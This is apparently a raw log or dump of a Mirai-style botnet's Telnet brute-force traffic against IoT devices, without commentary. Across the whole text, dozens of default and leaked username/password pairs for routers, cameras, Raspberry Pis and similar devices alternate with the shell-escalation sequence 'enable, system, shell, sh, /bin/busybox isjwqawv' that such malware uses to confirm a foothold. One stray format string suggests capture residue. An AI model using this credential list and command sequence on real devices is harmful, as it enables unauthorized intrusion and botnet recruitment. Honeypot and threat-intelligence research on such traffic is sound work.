trans

trans
enable
system
shell
sh
/bin/busybox isjwqawv
root

system
enable
system
shell
sh
/bin/busybox isjwqawv
craft
enable
system
shell
sh
/bin/busybox isjwqawv
supervisor

supervisor
enable
system
shell
sh
/bin/busybox isjwqawv
ftp

video
enable
system
shell
sh
/bin/busybox isjwqawv
nokia
enable
system
shell
sh
/bin/busybox isjwqawv
monitor

monitor
enable
system
shell
sh
/bin/busybox isjwqawv
root

qwertyuiop
enable
system
shell
sh
/bin/busybox isjwqawv
root

123456789
enable
system
shell
sh
/bin/busybox isjwqawv
manage

!manage
enable
system
shell
sh
/bin/busybox isjwqawv
root

ikwd
enable
system
shell
sh
/bin/busybox isjwqawv
installer

installer
enable
system
shell
sh
/bin/busybox isjwqawv
root

alpine
enable
system
shell
sh
/bin/busybox isjwqawv
root

root
enable
system
shell
sh
/bin/busybox isjwqawv
root

juantech
enable
system
shell
sh
/bin/busybox isjwqawv
super

forgot
enable
system
shell
sh
/bin/busybox isjwqawv
manuf

xxyyzz
enable
system
shell
sh
/bin/busybox isjwqawv
user
enable
system
shell
sh
/bin/busybox isjwqawv
patrol

patrol
enable
system
shell
sh
/bin/busybox isjwqawv
admin

2222
enable
system
shell
sh
/bin/busybox isjwqawv
root

arcsight
enable
system
shell
sh
/bin/busybox isjwqawv
admin

admin1234
enable
system
shell
sh
/bin/busybox isjwqawv
netman
enable
system
shell
sh
/bin/busybox isjwqawv
md110

help
enable
system
shell
sh
/bin/busybox isjwqawv
backdoor
enable
system
shell
sh
/bin/busybox isjwqawv
root

7ujmko0admin
enable
system
shell
sh
/bin/busybox isjwqawv
wproot

cat1029
enable
system
shell
sh
/bin/busybox isjwqawv
administrator

ggdaseuaimhrke
enable
system
shell
sh
/bin/busybox isjwqawv
root

idirect
enable
system
shell
sh
/bin/busybox isjwqawv
root

hi3518
enable
system
shell
sh
/bin/busybox isjwqawv
tutor
enable
system
shell
sh
/bin/busybox isjwqawv
admin

administrator
enable
system
shell
sh
/bin/busybox isjwqawv
wank

wank
enable
system
shell
sh
/bin/busybox isjwqawv
admin

1111111
enable
system
shell
sh
/bin/busybox isjwqawv
admin

9999
enable
system
shell
sh
/bin/busybox isjwqawv
rewt

satori
enable
system
shell
sh
/bin/busybox isjwqawv
cliuser

cliuser
enable
system
shell
sh
/bin/busybox isjwqawv
root

alien
enable
system
shell
sh
/bin/busybox isjwqawv
root

raspi
enable
system
shell
sh
/bin/busybox isjwqawv
private
enable
system
shell
sh
/bin/busybox isjwqawv
3ascotel
enable
system
shell
sh
/bin/busybox isjwqawv
system

manager
enable
system
shell
sh
/bin/busybox isjwqawv
demos
enable
system
shell
sh
/bin/busybox isjwqawv
intraswitch

asante
enable
system
shell
sh
/bin/busybox isjwqawv
root

klv1234
enable
system
shell
sh
/bin/busybox isjwqawv
admin

bintec
enable
system
shell
sh
/bin/busybox isjwqawv
netscreen

<<< %s(un='%s') = %u
enable
system
shell
sh
/bin/busybox isjwqawv
toor
enable
system
shell
sh
/bin/busybox isjwqawv
root

cat1029
enable
system
shell
sh
/bin/busybox isjwqawv
root

wh00t!
enable
system
shell
sh
/bin/busybox isjwqawv
cmc

password
enable
system
shell
sh
/bin/busybox isjwqawv
hax0r
enable
system
shell
sh
/bin/busybox isjwqawv
mobile

alpine
enable
system
shell
sh
/bin/busybox isjwqawv
backdoor
enable
system
shell
sh
/bin/busybox isjwqawv
manager

manager
enable
system
shell
sh
/bin/busybox isjwqawv
root

indigo
enable
system
shell
sh
/bin/busybox isjwqawv
root

00000000
enable
system
shell
sh
/bin/busybox isjwqawv
root

dasdec1
enable
system
shell
sh
/bin/busybox isjwqawv
admin

123456
enable
system
shell
sh
/bin/busybox isjwqawv
security

security
enable
system
shell
sh
/bin/busybox isjwqawv
tech

tech
enable
system
shell
sh
/bin/busybox isjwqawv
admin

pass
enable
system
shell
sh
/bin/busybox isjwqawv
swift

swift
enable
system
shell
sh
/bin/busybox isjwqawv
root

abc123
enable
system
shell
sh
/bin/busybox isjwqawv
root

tandberg
enable
system
shell
sh
/bin/busybox isjwqawv
admin

atlantis
enable
system
shell
sh
/bin/busybox isjwqawv
default
enable
system
shell
sh
/bin/busybox isjwqawv
db2fenc1

db2fenc1
enable
system
shell
sh
/bin/busybox isjwqawv
admin

meinsm
enable
system
shell
sh
/bin/busybox isjwqawv
superuser

passw0rd
enable
system
shell
sh
/bin/busybox isjwqawv
root

h2014071
enable
system
shell
sh
/bin/busybox isjwqawv
admin

7ujmko0admin
enable
system
shell
sh
/bin/busybox isjwqawv
admin

qwestm0dem
enable
system
shell
sh
/bin/busybox isjwqawv
db2as

ibmdb2
enable
system
shell
sh
/bin/busybox isjwqawv
super

super
enable
system
shell
sh
/bin/busybox isjwqawv
operator

profense
enable
system
shell
sh
/bin/busybox isjwqawv
adminlvjh

adminlvjh123
enable
system
shell
sh
/bin/busybox isjwqawv

enable
system
shell
sh
/bin/busybox isjwqawv
root

1234567890
enable
system
shell
sh
/bin/busybox isjwqawv
cisco
enable
system
shell
sh
/bin/busybox isjwqawv
pi

raspberry
enable
system
shell
sh
/bin/busybox isjwqawv
root

vmware
enable
system
shell
sh
/bin/busybox isjwqawv
admin

admin
enable
system
shell
sh
/bin/busybox isjwqawv
service

service
enable
system
shell
sh
/bin/busybox isjwqawv
gamez

lrkr0x
enable
system
shell
sh
/bin/busybox isjwqawv
root

rootme
enable
system
shell
sh
/bin/busybox isjwqawv
superuser

123456
enable
system
shell
sh
/bin/busybox isjwqawv
citel
enable
system
shell
sh
/bin/busybox isjwqawv
craft

crftpw
enable
system
shell
sh
/bin/busybox isjwqawv
root

user
enable
system
shell
sh
/bin/busybox isjwqawv
jill
enable
system
shell
sh
/bin/busybox isjwqawv
root

rain
enable
system
shell
sh
/bin/busybox isjwqawv
date
enable
system
shell
sh
/bin/busybox isjwqawv
manager

friend
enable
system
shell
sh
/bin/busybox isjwqawv
manager
enable
system
shell
sh
/bin/busybox isjwqawv
admin

password
enable
system
shell
sh
/bin/busybox isjwqawv
cisco

cisco
enable
system
shell
sh
/bin/busybox isjwqawv
root

123qwe
enable
system
shell
sh
/bin/busybox isjwqawv
r00t
enable
system
shell
sh
/bin/busybox isjwqawv
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox isjwqawv
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox isjwqawv
4dgifts
enable
system
shell
sh
/bin/busybox isjwqawv
root

m
enable
system
shell
sh
/bin/busybox isjwqawv
root

video
enable
system
shell
sh
/bin/busybox isjwqawv
administrator

1234
enable
system
shell
sh
/bin/busybox isjwqawv
admin
enable
system
shell
sh
/bin/busybox isjwqawv
root

admin
enable
system
shell
sh
/bin/busybox isjwqawv
root

zlxx.
enable
system
shell
sh
/bin/busybox isjwqawv
nsroot

nsroot
enable
system
shell
sh
/bin/busybox isjwqawv
root

admin
enable
system
shell
sh
/bin/busybox isjwqawv
admin

infoblox
enable
system
shell
sh
/bin/busybox isjwqawv
root

qwe123
enable
system
shell
sh
/bin/busybox isjwqawv
root

vizxv
enable
system
shell
sh
/bin/busybox isjwqawv
superuser
enable
system
shell
sh
/bin/busybox isjwqawv
informix

informix
enable
system
shell
sh
/bin/busybox isjwqawv
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox isjwqawv
admin

4321
enable
system
shell
sh
/bin/busybox isjwqawv
tech
enable
system
shell
sh
/bin/busybox isjwqawv
iclock

timely
enable
system
shell
sh
/bin/busybox isjwqawv
root

123
enable
system
shell
sh
/bin/busybox isjwqawv
admin

switch
enable
system
shell
sh
/bin/busybox isjwqawv
